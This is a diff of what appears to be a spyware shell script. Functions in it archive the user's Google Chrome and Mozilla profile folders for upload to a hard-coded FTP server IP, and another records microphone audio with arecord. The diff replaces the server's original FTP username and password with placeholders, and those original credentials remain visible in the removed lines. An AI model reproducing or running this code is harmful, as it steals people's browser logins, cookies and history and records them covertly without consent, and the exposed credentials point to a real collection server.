@@ -62,8 +62,8 @@ function GCx(){
 
 function GCx_(){
 	ftp_server="139.162.128.166"
-	ftp_user="r00t1970"
-	ftp_password="@Hello.321/"
+	ftp_user="xyz"
+	ftp_password="xyz"
 	#
 	folder_to_compress="/home/$USER/.config/google-chrome"
 	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
@@ -88,8 +88,8 @@ function GCx_(){
 
 function MZLx_(){
 	ftp_server="139.162.128.166"
-	ftp_user="r00t1970"
-	ftp_password="@Hello.321/"
+	ftp_user="xyz"
+	ftp_password="xyz"
 	#
 	folder_to_compress="/home/$USER/.mozilla"
 	local_file="$IBUS_"`date +%s`"mzlx.tar.gz"
@@ -136,7 +136,7 @@ function ax_(){
     output_file="a.wav"
     #
     amixer set Capture cap
-    amixer set Capture cap
+    #amixer set Capture cap
     #
     dbgx "ax started..."
     arecord -f cd -d $duration -t wav -r 44100 $IBUS_$output_file
